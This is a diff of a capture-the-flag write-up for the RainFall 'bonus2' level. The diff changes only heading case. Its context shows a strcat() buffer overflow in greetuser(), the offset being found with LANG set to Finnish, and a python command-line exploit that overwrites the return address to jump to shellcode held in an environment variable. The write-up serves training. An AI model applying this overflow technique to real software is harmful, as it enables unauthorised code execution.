@@ -1,6 +1,6 @@
-# Bonus2
+# bonus2
 
-## Exploring the binary
+## exploring the binary
 ```shell
 bonus2@RainFall:~$ ./bonus2
 bonus2@RainFall:~$ ./bonus2 phantom
@@ -186,7 +186,7 @@ This function uses <code>strcat()</code> to join two strings. Depending on the v
 0x8048710:	 "Hello "
 ```
 
-## Buffer overrun attack
+## buffer overrun attack
 Since the <code>greetuser()</code> function uses <code>strcat()</code>, it will be vulnerable to a <code>buffer overflow</code> attack once again. To find the offset, we use the ([Wiremask](https://wiremask.eu/tools/buffer-overflow-pattern-generator/)) tool as we did previously and set the environmental variable <code>LANG</code> to one of the two languages to make the string longer compared to English. It does not matter which language we choose, because both foreign language greetings have the same length.
 ``` shell
 bonus2@RainFall:~$ export LANG="fi"
@@ -209,7 +209,7 @@ SCODE set at 0xbffff85c
 ```
 Based on the information from <code>main()</code>, we know that <code>0x28</code> (40) bytes are copied from <code>av[1]</code>. With this knowledge, we can now construct the exploit.
 
-## Exploit
+## exploit
 ``` shell
 bonus2@RainFall:~$ ./bonus2 $(python -c 'print "A" * 40') $(python -c 'print "B" * 18 + "\xbf\xff\xf8\x5c"[::-1]')
 Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBB\���
